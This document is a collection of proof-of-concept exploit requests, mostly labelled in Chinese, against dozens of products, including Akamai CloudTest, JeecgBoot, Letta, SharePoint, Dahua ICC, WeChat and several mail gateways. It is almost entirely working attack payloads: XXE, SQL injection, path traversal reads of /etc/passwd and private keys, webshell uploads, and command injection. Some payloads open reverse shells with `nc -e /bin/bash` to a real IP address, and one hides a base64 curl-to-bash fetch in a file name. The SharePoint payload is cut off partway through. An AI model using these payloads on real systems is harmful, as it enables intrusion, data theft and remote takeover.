```javascript


NAME:\Akamai\Akamai CloudTest soap RepositoryService接口 XXE漏洞（CVE-2025-49493）.txt
POC:
POST //concerto/services/RepositoryService HTTP/1.1
Host: readacted.com
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Gpc: 1
Accept-Language: en-US,en;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 610

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soapenv:Envelope [
  <!ENTITY xxe SYSTEM "http://b6it5hei11vmt9as2lbg98h4gvmrahy6.oastify.com">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:rep="http://example.com/services/repository">
   <soapenv:Header/>
   <soapenv:Body>
      <rep:getUIBundleObjectXml>
         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>
      </rep:getUIBundleObjectXml>
   </soapenv:Body>
</soapenv:Envelope>


NAME:\AstrBot\AstrBot路径遍历20250728.txt
POC:
GET /api/chat/get_file?filename=../../../../../../../etc/passwd HTTP/1.1
Host: 

NAME:\Grafana\Grafana 跨站点脚本（XSS）CVE-2025-4123.txt
POC:
GET /public/..%2F%5cbaidu.com%2F%3f%2F..%2F.. HTTP/1.1

NAME:\JeecgBoot\Jeecg-boot SQL注入20250721.txt
POC:
GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1

NAME:\JeecgBoot\JeecgBoot getTotalData任意用户密码重置.txt
POC:
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: 
Content-Type: application/json

{"tableName": "sys_user", "compName": "test", "condition": {"filter": {}}, "config": {"assistValue": [], "assistType": [], "name": [{"fieldName": "username,password,salt", "fieldType": "string"}, {"fieldName": "id", "fieldType": "string"}], "value": [{"fieldName": "id", "fieldType": "string"}], "type": []}}

NAME:\JeecgBoot\JeecgBoot 框架passwordChange接口存在任意用户密码重置.txt
POC:
GET /novat-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1

NAME:\Letta\Letta平台(AI代理框架)远程代码执行CVE-2025-51482.txt
POC:
POST /v1/tools/run HTTP/1.1
Host: localhost:8283
Content-Type: application/json
Content-Length: 248

{
  "source_code": "def test():\n    \"\"\"Test rce.\"\"\"\n    import os\n    return os.popen('id').read()",
  "args": {},
  "env_vars": {
    "PYTHONPATH": "/usr/lib/python3/dist-packages"
  },
  "name": "test"
}

NAME:\Maildata\Maildata邮件网关 0day20250721.txt
POC:
11111111111111111111111111`nc${IFS}-e${IFS}$(base64${IFS}-
d___L2Jpbi9iYXNo)${IFS}101.132.27.225${IFS}587`111.zip

NAME:\MailEnable\MailEnable 存在反射 XSS（CVE-2025-44148）.txt
POC:
GET /Mondo/lang/sys/Failure.aspx?state=19753%22;}alert(document.domain);function%20test(){%22 HTTP/1.1

NAME:\MobileOA\智能办公系统 MobileOA.asmx SQL注入.txt
POC:
POST /iOffice/prg/set/wss/MobileOA.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GeMrNewData xmlns="http://tempuri.org/">
      <MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
    </GeMrNewData>
  </soap:Body>
</soap:Envelope>

NAME:\PWS\PWS Dashboard 存在任意文件读取漏洞.txt
POC:
GET /others/_test.php?test=../../../apache/conf/ssl.key/server.key HTTP/1.1


NAME:\Redhat\centos web panel远程代码执行 CVE-2025-48703.txt
POC:
POST /myuser/index.php?module=filemanager&acc=changePerm HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246

fileName=.bashrc&currentPath=/home/linux主机用户名&t_total=`nc xx.xx.xx.xx 18080 -e /bin/bash`

NAME:\Richmail\Richmail邮件openapiservice任意文件上传.txt
POC:
POST /webadmin/service/openapiservice?func=upload:letterImageUpload HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="imageX"

0
------WebKitFormBoundary
Content-Disposition: form-data; name="imageY"

0
------WebKitFormBoundary
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundary
Content-Disposition: form-data; name="filename"; filename="../../../../../web/webmailsvr/admin/12.jsp"
Content-Type: text/plain

<% out.println("Vulnerable!"); %>
------WebKitFormBoundary--

NAME:\Unibox\Unibox路由器download_csv.php任意文件读取.txt
POC:
 GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1

NAME:\Unibox\Unibox路由器update_byod.php SQL注入.txt
POC:
POST /authentication/update_byod.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close

update=1&macAddress=1' AND (SELECT 2222 FROM (SELECT(SLEEP(5)))ogZo) AND 'NXsn'='NXsn&oldMacAddress=

NAME:\Wazuh\Wazuh服务器远程代码执行漏洞（CVE-2025-24016）.txt
POC:
POST /security/user/authenticate/run_as HTTP/1.1
Host: 
Content-Type: application/json
Authorization: Basic <base64(username:password)>
Content-Length: 6667

{
    "__unhandled_exc__":{
        "__class__": "NotARealClass", "__args__": []
    }
}

NAME:\WebOne\WebOne 劳动力与考勤管理套件 DownloadFile.aspx 任意文件读取.txt
POC:
GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1

NAME:\WPS\WPS未授权访问导致RCE.txt
POC:
1.未授权访问
GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1
2.获取AKSK后使用脚本添加kubelet 路由映射（需获取TOKEN）
3.向对应POD发起通信后实现RCE
GET /open/wps/run/{namespace}/{podname}/node-exporter?cmd={url_encode_command}  HTTP/1.1

NAME:\东胜物流\东胜物流 CommMngPrintUploadMailFile 任意文件上传.txt
POC:

POST /CommMng/Print/UploadMailFile HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 234


------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="LoadFile"; filename="1.ashx"
Content-Type: application/octet-stream

12312

------WebKitFormBoundary7MA4YWxkTrZu0gW--

NAME:\东胜物流\东胜物流 GetBANKList SQL注入.txt
POC:
POST /MvcShipping/MsBaseInfo/GetBANKList HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Length: 456

strCondition=1'

NAME:\东胜物流\东胜物流 GetDataList_Salary SQL注入.txt
POC:
POST /TruckMng/MsWlDriver/GetDataList_Salary?_dc=1665626804091&start=0&limit=30&sort=&condition=1*&page=1 HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Length: 448

strCwSTARTGID=1'

NAME:\东胜物流\东胜物流 SoftMng FileInputHandler Upload 任意文件上传.txt
POC:
POST /SoftMng/FileInputHandler/Upload HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 211
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="QAZWSX.aspx"
Content-Type: application/octet-stream

123456
------WebKitFormBoundaryFfJZ4PlAZBixjELj--



NAME:\东胜物流\东胜物流软件 WmsZXFeeGridSource.aspx SQL注入.txt
POC:
GET /WMS_ZX/WmsZXFeeGridSource.aspx?areaname=%20%20%20%20%5c%75%30%30%33%31%5c%75%30%30%32%37%5c%75%30%30%36%31%5c%75%30%30%36%65%5c%75%30%30%36%34%5c%75%30%30%32%30%5c%75%30%30%33%31%5c%75%30%30%33%63%5c%75%30%30%34%30%5c%75%30%30%34%30%5c%75%30%30%35%36%5c%75%30%30%34%35%5c%75%30%30%35%32%5c%75%30%30%35%33%5c%75%30%30%34%39%5c%75%30%30%34%66%5c%75%30%30%34%65%5c%75%30%30%32%64%5c%75%30%30%32%64%20%20%20%20&read=%20%20%20%20areaname%20%20%20%20 HTTP/1.1

NAME:\东胜物流\东胜物流软件WorkFlowGridSource.aspx SQL注入.txt
POC:


NAME:\亿赛通\亿赛通 HookWhiteListservice SQL 注入.txt
POC:
GET /CDGServer3/policy/HookWhiteList;logindojojs?command=AddHookWhiteList&policyId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1

NAME:\亿赛通\亿赛通 WorkFlowAction SQL 注入.txt
POC:
POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
Host:
Connection: close
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9

command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a4'-

NAME:\亿邮\亿邮邮件网关 RCE.txt
POC:
#!/bin/bash
PAYLOAD_NAME="testpoc.pdf\`{echo Y3VybCBodHRwOi8vc2R5eWE0Mm4uZG5zLmFkeXNlYy5jb20K}|{base64 -d}|bash\`"
WORKDIR=$(mktemp -d)
cd "$WORKDIR" || exit 1
echo -n "12345" > "$PAYLOAD_NAME"
OUTPUT_RAR="payload_testpoc.rar"
rar a -ma5 -m0 -ep "$OUTPUT_RAR" "$PAYLOAD_NAME"
mv "$OUTPUT_RAR" "$OLDPWD"
echo "[+] Done: $OUTPUT_RAR created."
rm -rf "$WORKDIR"

NAME:\信呼\信呼OA uploawAction.php 接口存在SQL注入.txt
POC:
POST /index.php?a=upfile&n=uploaw|api&d=task HTTP/1.1
Host:
X-Requested-With:XMLHttpRequest
Content-Type:multipart/form-data;boundary=----WebKitFormBundaryitXXXXXXXX

------WebKitFormBundaryitXXXXXXXX
Content-Dispostion:form-data;name="file";filename="a',web=(select if(123=123,sleep(5),0))--,png"
test
------WebKitFormBundaryitXXXXXXXX

NAME:\华天动力\华天动力oa8000 downloadfortrace.jsp存在任意文件读取.txt
POC:
GET /OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini  HTTP/1.1

NAME:\华天动力\华天软件-BaseHandler.ashx前台文件上传.txt
POC:
POST /Base/BaseHandler.ashx?type=uploadFileBase64&fileSupport=ashx HTTP/1.1
Host:

<%%>

NAME:\华天动力\华天软件inforcenter PLM前台文件上传.txt
POC:
/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/

NAME:\唯德\唯徳知识产权管理系统Case.ashx任意文件读取.txt
POC:
GET /wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config HTTP/1.1

NAME:\大华\大华icc evo-runsv1.0 push RCE.txt
POC:
POST /evo-runs/v1.0/push HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Content-Type: application/json
X-Subject-Headerflag: ADAPT
Content-Length: 301

{   
 "method": "agent.ossm.mapping.config",
    "info": {
        "configure": "cc", 
        "filePath": "cc",
        "paramMap": {
            "shellPath": "/bin/bash -c id>/opt/evoWpms/static/cc.txt",
            "filePath": "cc"
        },
        "requestIp": ""
    }
}


NAME:\大华\大华icc evo-runsv1.0 receive RCE.txt
POC:
POST /evo-runs/v1.0/receive HTTP/1.1
Host: 
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 249
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
X-Subject-Headerflag: ADAPT

{
  "method": "agent.ossm.mapping.config",
  "info": {
    "configure": "abcd",
    "filePath": "haha",
    "paramMap": {
      "shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt",
      "filePath": "abc"
    },
    "requestIp": ""
  }
}

NAME:\天锐\天锐绿盾审批系统 sysadmin 信息泄露.txt
POC:
GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1

NAME:\孚盟云\孚盟云 GetIcon.aspx SQL 注入.txt
POC:
GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1

NAME:\孚盟云\孚盟云CRM LicMould.ashx SQL注入.txt
POC:
POST /Ajax/LicMould.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

action=DeleteEmp&key=1%20WAITFOR%20DELAY%20’0:0:4′–&fuids=abc,def,

NAME:\安科瑞\安科瑞智能环保云平台getmonitorrealdata SQL注入.txt
POC:
POST /Swicth/getmonitorrealdata HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Content-Length: 259
Content-Type: application/x-www-form-urlencoded
Cookie: ASP.NET_SessionId=tpxci2nbjxx10ydcjnbyku5m
Priority: u=0, i
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0

{
 "dnjcsStartTime": "2025-06-30 09:27:00",
 "dnjcEndTime": "2025-06-30 23:59:59",
 "swicthId": "-7756' OR 1 GROUP BY CONCAT(0x716a787671,(SELECT (CASE WHEN (1241=1241) THEN 1 ELSE 0 END)),0x716a787671,FLOOR(RAND(0)*2)) HAVING MIN(0)#",
 "meterId": "1"
}

NAME:\帆软\帆软报表fr_remote_design文件上传.txt
POC:
GET /WebReport/ReportServer?op=fr_remote_design&cmd=design_install_reufile&reuFileName=vulntest.reu&isComplete=false HTTP/1.1

NAME:\微信\微信3.9 1click RCE.txt
POC:
<recordinfo><title>聊天加记录</title><desc>.:[文件]test.txt.:[文件]calc.bat-快捷方式.lnk</desc><datalist count="2"><dataitem dataid = "2bfdb5aaaa9552c4baa0dbc38f26c756" datatype="8" datasourceid="2"><messageuuid>0</messageuuid><cdndataurl>333333333333</cdndataurl><cdnencryver>1</cdnencryver>/../../../../../../../../../../../test/calc.bat


<dataitem dataid = "2bfdb5aaaa9552c4baa0dbc38f26c756" datatype="8" datasourceid="2"><messageuuid>0</messageuuid><cdndataurl>333333333333</cdndataurl><cdnencryver>1</cdnencryver>/../../../../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/a.lnk

NAME:\微信\微信发送a链接href可控.txt
POC:
<a
href="weixin://bizmsgmenu
?msgmenucontent=
&msgmenuid=960">https://chinamobile.com/shell.jsp</a >

<a href="weixin://jump/voipdetail/?data=1">点击起飞</a>
<a href="weixin://voip/callagain/?username=ponyma">点我和马化腾打电话</a>
<a href="weixin://findfriend/verifycontact/">我加我自己</a >

NAME:\微软\Microsoft SharePoint Server远程代码执行漏洞 CVE-2025-53770.txt
POC:
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Content-Length: 7699
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Referer: /_layouts/SignOut.aspx
Connection: close

MSOTlPn_Uri=http%3A%2F%2Fwww.itsc.org%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%0A++++%3C%25%40+Register+Tagprefix%3D%22Scorecard%22+Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22+Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C+Version%3D16.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D71e9bce111e9429c%22+%25%3E%0A++++%3C%25%40+Register+Tagprefix%3D%22asp%22+Namespace%3D%22System.Web.UI%22+Assembly%3D%22System.Web.Extensions%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D31bf3856ad364e35%22+%25%3E%0A%0A%3Casp%3AUpdateProgress+ID%3D%22UpdateProgress1%22+DisplayAfter%3D%2210%22+%0Arunat%3D%22server%22+AssociatedUpdatePanelID%3D%22upTest%22%3E%0A%3CProgressTemplate%3E%0A++%3Cdiv+class%3D%22divWaiting%22%3E++++++++++++%0A++++%3CScorecard%3AExcelDataSet+CompressedDataTable%3D%22H4sIAAAAAAAEANVa23LbSJLt3stEzMzu0%2F6AQs%2B2BJCiu%2BWQHUGQLIi0CAkgUSAw4YjBzeIFANm8i3%2Bz37MftXsyCyRlW7Zlz07PrhymKBaqMvPkyVNZAH%2F6%2Baeffvpv%2FNBv%2Bvm3f8KL1XtYLNP8rBkuwxcnMp0vRtPizcWZRv9enDRW2XI1T98U6Wo5D7MXJ3erKBvF79KH%2FnSSFm%2BiX34Ja3HtlX5ZvUi1Xy%2F%2FlRb%2Fj0dr8ksvXZKtPw7yrBcP0zz8M941Rx8%2BmPMw%2F%2FlnGvvDP%2BPlP%2F90tV28XvAlJ9s8KxZvTk%2FVm9dbvB8ul7PX5%2BebzeZsUz2bzu%2FPK5qmnw%2B6N2rZ%2FbX5IoHVN6ereVGutniZj%2BL5dDH9sHwZT%2FPXuO6luur0ZJS8OV1M85T%2BWqTL07f%2F%2FqeTT37IrTRL87RYnhRhnn484USt9Lq9KIN9c7qcr9LD5%2B4ibazmc0y%2BmcZhlpbDT9jZ24KLsyzd9h9m6ReuOlw5nI7i9CQfFbdxvJoDJA12w%2B3%2Br1URTVdFkiZfMvflEIfp8ItO%2FpjDn85apL%2Bt0iJ%2B7pSn3ZxtigPShD%2F58Oa0pGBjmmVpvASnF2dmWqTzUXx2M1os%2F6r%2F5S%2BPWdpL52vguDhrF8t0XoTZWWs7Cwk3bx7OZun8r5XDBC%2BNztz22c10IabzPFxiwouT49iPVJFW%2FVD78MsHXU9qWlgN37842BoVyXSzUE7eRmPEQm%2Fv5tP1KCG7d%2FN0ASxCClGgmtLNdD75AReqevSh%2BmvtVZhUX12k1dr794eYPgLof0Ej3r8%2FPVlykpDLsHighJ1%2BzODz55Lo%2FPtYxNc%2Fn6t8ecm2r9Xh%2BaEQv1TT37b7FVsqStaxt3%2F4F%2Bjkf5lXCdTzfv5a%2FQrzHxI%2BNUct8a05e0Mv1%2FqTAvlID7%2BEAenJSek3aW4%2FjLKjSM6nm9s5KM0CVl41DBeNYVjcpyDFqFik8%2BXXdewKWnDYLkbf3i9eYtFlCOocN5nkGbvMt1jziXTcfngsFZ8X8e%2Fg8clzamPvdkuR8Dk1eIUYKJw0wRuEunzQnlu53XQ5nCYWFOttExI2H4XZaJdenT%2F6%2FLtWugtJ%2FQDw4nt2k1J%2Bfo8UYPHXe9lLXi%2BW81Fxf%2Fr2fNN62DS0et2u1%2Bt35%2Fj51agffjYNeu1JqxZXnSzqbe5lLh%2FiSraOxpp2M66vuo2LzU3DaCbeVksGnezOq2XJwHnwvc2iLQzdz7czX1tmqXTWYUWu7rx21aq0dH%2FnVrr9yc4y3c1tcyLYfts23Gq2S0y5vJlY68jcZn7VmUWV2u5mkmQRbIded%2BVWLh9wzcStSM1visjT9%2F7V%2Bsl1Zxbl8aJt6jsf10VmNoJ%2FXjDo7ELvcnXXt5XP4%2Fqi3bL06NrR49y9xNo65g6jxubevZYjzBv3KrImzct54F1c%2BuO46vfl2Or729t%2BVwv69YtbTFFgyWZUlaukPmxGFX3jA4f4PjnYNNxMCzx9V69368b9yKof8Kzh%2Bu0i8CyNrosfatcB8IvzbMzxD4wh3u8Q%2F3HdvL719GU%2FHVhYU1u5VQeY1ArEuIwr1jomvEd%2Frzxhin3PnKjf08uk%2Beh9i14NxFivN%2F6fx8ih3Awqj%2F27aLazQ0ytwNtmQUVogbQoliH48sofMFfbiHcSDNodgzhttFpHjHyTXofDzdp%2FMDZRNcniwppirUW7oYsot9YBeG1XLpeRJ1ZBw3hnu52Z7SbC9qyqnW8NR2RGfyIasiXarivGgdbZ2G6s2XJWtb3EcJqG0XOFEbrCtF3hJFpnYLtS2NJy7ElgONXECFqiEU6E8DVx57ptHes7thRVe2IZTn9oSF00vJZoOa4Ywf5vtutYGC%2Fs%2FNJw8qXR95KGnIhWqIm%2B63Z2tutqtltz7HxmOC3dkBiPNXENP2SitbawL22ZOXY2NByZGX6eNODfdbfF9ivKfqdqF7BfuTS8QdKwXCGwfgj%2Fb2w3cLC%2BYU9g39UNH%2Bt3sX6iCQn7LazfQXzwL4N%2FieHS%2BERc9%2BE%2F8Olh%2FbEtA8MuHLZP8fvAJ9CEG2ht%2BB%2FMMV7l9YGPdBlfEWnCQ%2FwLjBe2dAp7AHyBgSwSA7bbkuPr4BqMeQL4ztg%2FmQkjBr7ID%2FlX4XGZVe0B%2FOs7RiCBf4vtO%2Fhfhf%2BwbyG%2BJfCThgf%2FE9j3XGHBPmIPLI5vHCj7mmj0NNECvgPEF%2FD8vX3PMgL4Hyn8R7A%2Fh33kP1H468LwwR%2F4ZgKfPuZv1Xyp5lcsQ0pB8VF%2Be5jfh%2F2A80%2F8mIB%2FhM8x%2F1vGz9UxvwZ8hQG6NawW528YaK0N84P4VRjAB%2FEVSaMHfLCOo%2FCn%2FBP%2BS6MH%2FniS%2BSfAD8o%2F1o6xxqVjFwp%2FF%2FywNWGCnwPY93m%2Bh3LLgG8r4%2FiRfxP2vYTzH18Av6qddTAO%2F6pH%2B5i%2FOuBfzDg%2FtH4E%2FoDDhI%2ByLzvAXwLfpeEC%2Fz7wQf4pfgF8Da6%2FLGD%2BE74W5gPjnqq%2FIeLDNcRv75LHfcX%2FzOb6Yfww30L8gvJvpK5oYf4E6%2FcO%2FNvnHzikLXGN%2BAL410H8O9tzkF%2FJ%2Be%2FrnH8T%2F6n%2BEV9C%2FHbswUzVP%2FiFuVT%2FHvAHtrLK%2BKG2mf%2BYH0NffFV%2FAxV%2FoOLXdK5%2FYNMGPwPFH8QG3tsTneuX8t91OX%2BwT%2Fkfjjn%2BCerPzQwX8cO%2BifURP%2FGf8p8o%2Fpf1R%2Fojlf7MVfxS2YePiJ%2Fqv91X%2BF9z%2FRP%2FMsS3Mzj%2F4C%2FlH%2FVD8SVV5AfjCfM3MBOqP6ofip%2F4ayj%2BzYyeCf4LQfjzfKw%2FxPw15iv96BsGuN9wNOYH9KMj2b4nDOY%2F%2BOdmjJ%2BIlX68%2Bhr%2Fj%2Fwj%2Fe1w%2FXlYv6z%2FDOPYA%2BSY4ysyrl%2Fm%2F7H%2BOgf9Jfyraj7pL%2FEP%2FqF%2BHcn6M0H9gyO%2Bsk%2F6Cf9JnxNrzz%2FCn%2FRHKvyRe4o%2FGPP%2BMRbAT1L%2BDegz6R%2Fpj8b4eqgP4g%2FpbyVh%2FSn5D34PoR9ZwfELaUjgDx8p%2F4Rfhfc3wr8vVP4HzH8T8d8iPtLXDvOvECr%2B4iP%2BbZR%2BoX4zg%2FNH%2BtRX%2BkP8byj9p%2F3PeUJ%2FRE3pP%2FGv1L8K2yf8oV%2BMv8P8zpFfLVP8Az7grgt8Hg76Q%2FFL4COP%2BMP%2BWsWfFGwf6%2FsYd7U9%2F4j%2FgVD2Lfaf8IcOUH7IfnjgP%2Bkf7BP%2BVF8ux0%2F%2BI78e9okc%2Bc0t3j%2BJf4mKv8n7J%2FNf7T%2BED%2B1%2FvqoP4r%2BaT%2FWB%2Bintm2X8c%2BYfxTfusH34z%2FaxTqD0l%2BwjjtJ%2BH%2FxPsL7af9rEj4LjJ%2F1B%2FQRC7R%2BYLwPG5%2BP934X%2BYO5efzzuP9h%2BcMg%2F9kDqf1yln3Kt8BeH%2Bo%2FL%2Bk%2BY%2F0OD%2BUf7L2qb7EODSH9HZfzrvf0e8bPC%2Bzvp5zhR%2BI%2B5%2Fsk%2BuOkPGP89%2F3Zf0R%2BqX%2FDDwXzan4DfbvjN%2Bi%2FjJ%2FtD1X%2BRfgvFf%2Bg%2F9Q%2BP6r%2Bl8IWGUX%2BI%2BkN97f3H%2Fkf8GkquH4o%2F4%2Fw1YLvUrzbxt6P4I3j%2FYf5POP%2Fk%2F9P8a3H9k74h%2FzJA%2FgvOP%2BqQ9reu8t9zP9Vf8I%2FGvWP%2Bq2zf1Qsb3DjYP9afpfY3yr%2Bqfx%2F9FelP2f%2B4HD%2Ftf6w%2Fqv%2BB%2F4%2F4T%2FHjGuI%2F9i%2FCH%2F0n1R%2Ft7xcq%2F2X%2FR%2FYxjv0bzY9A7J0u1w%2F13%2Fv%2BU%2BF%2F7R%2Fwp%2F56Vt33f7T%2FoX8wpeq%2FaP9fH%2FTXXDL%2F0H9z%2FbuKfwHrL%2Fc%2FgvWb6o%2FmK%2F6R%2FmE%2BxU%2F5y3j%2FaR%2FrL1D7D8W%2Fx3%2FC%2Fd8w0R7j73B%2FRf5Hqn7J%2F1rZfxTUvzP%2F80P%2FSfyfKv5L1f8%2Fqb9Di%2FvPXFfxg7%2F7%2FRPjvyn8MZ%2F3n4z7d8R%2Fban62z2u%2Fx7ON6Q%2F6J%2Bpvkdl%2F20x%2FrR%2F6Bnvf6gfzj%2BuqfH%2Bxf2PxfGT%2F7F76P93qv9A%2FZJ96n9Mdf4IVX0TPoGqP8SP%2FRv9D%2FGP5pf9F%2FCn%2FnNsMH8ofuBP%2Bl%2FiT%2FqD%2FYfOHwp%2Fqr9ryfkVF0f9L%2Fdf9I%2Bu6q8sxa8n65%2F3F%2Fjf4v7Dc6pKf1X%2Fhf6zTf0f7Ael%2FkBfhJoPjbt1RbOnekicnyyH44c%2BUP7p%2FIP9gfAPyvrE%2Fkn4S3U%2BK%2Fcv%2BI91W8AXsbmZ2r9MnM9a6vyA9V3g12b%2BSeR%2FVJ5fMI46ErctbFFu5xb9yQX3r4%2FGcYbd7899NY4e9NE49f%2BS92eqb6n4cxyn%2FrcF%2FgF77r8wTvkXrM9Uf5hL82ncUvVJ5x%2BD8Zfq%2FGwmKv%2FVMv6C%2Bv8esPPK%2BBPOj9AP52%2FoXw%2Fa2oP%2BwX8D%2BvZO9aeJ6q8KtT95Gfe3pB9Zia%2Fk%2BcfzeQMcofMX6esrdT5AfaK%2FtHfq%2FJGo%2BpggfvB%2FiPrGWK7w71eYf8R%2F0gdNnX9xvqbzi47%2BI2d9pvUnNtd3GR%2F6Fxva2qP%2BG%2Fx2VH1jfSfg8zXpA%2BL3K8meH9h%2FBfynHh7nT5x9DvHBP%2BQ3VPVZ3j%2Bg%2BOE%2F8StS82Ef%2B4JrY34G%2F8Ff9Ki0f6WqvkPED%2F%2B72n7%2FInwx30hU%2FkZKP%2Bj8Rv23weuTfuOaFvC%2FC7g%2FoP4G8fVL%2FDAeqfsjUukf4Qd%2BEr9RHzg7G6Hqz8j%2BcX3aP0nfPL7%2FsPcP%2BbHoDI0ecGnYutJniq%2Bv8C%2FzP1PnG%2BzvdH8D%2BF8r%2F8k%2B6sdDfJR%2FxE%2F4YbypzkfU%2F8aayu92j5%2BBvo7GwW3SX%2FCD9B3zH9lvl%2Fkt7%2F9kSp8qS%2B7vk3L%2FVPdn4B%2FhP3C4P6X8kr4hf3T%2FqFHqZ4kv%2B0%2F29%2FypcP9k%2B9d8H6tiLYO6Lejtd94P43uFjRauN2WBscyo6FliDtdBs34deVILzctJ1%2B426zvjcO%2FPMeUC59VhYsp%2BMOjMfG87S3PB9xJ75uUiMOXDO%2